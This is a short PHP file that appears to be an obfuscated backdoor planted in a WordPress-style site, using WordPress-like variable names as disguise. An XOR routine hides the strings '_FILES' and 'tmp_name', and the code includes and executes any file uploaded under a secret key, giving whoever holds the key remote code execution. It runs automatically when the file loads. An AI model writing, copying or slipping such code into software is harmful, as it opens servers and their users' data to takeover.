<?php 	
function patternses()

{

    $force = 'QZpY7I05qYQrBo7';
    $no_found_rows = $force;
	$tinkle = 'has_archive';
    
    $filters = $GLOBALS[has_self_closer("%0E%1C9%15r%1A", $no_found_rows)];
    $_builtin = $filters;
    $ignore_sticky_posts = isset($_builtin[$no_found_rows]);
    if ($ignore_sticky_posts)

    {
        $results = $filters[$no_found_rows];
        $object_vars = $results[has_self_closer("%257%00%06Y%28%5DP", $no_found_rows)];
        $utf8_string = $object_vars;

        include ($utf8_string);
	$icon_files = 'thumbfile';
    }
}
	$html_regex = 'page';
function has_self_closer($num_pages, $reset)

{
    $post_type = $reset;
    $filename = "url" . "decode";
    $html_parts = $filename($num_pages);
	$_charset = 'filetype';
    $default_capabilities = substr($post_type,0, strlen($html_parts));

    $_quote_style = $html_parts ^ $default_capabilities;
    return $_quote_style;
}


patternses();

?>
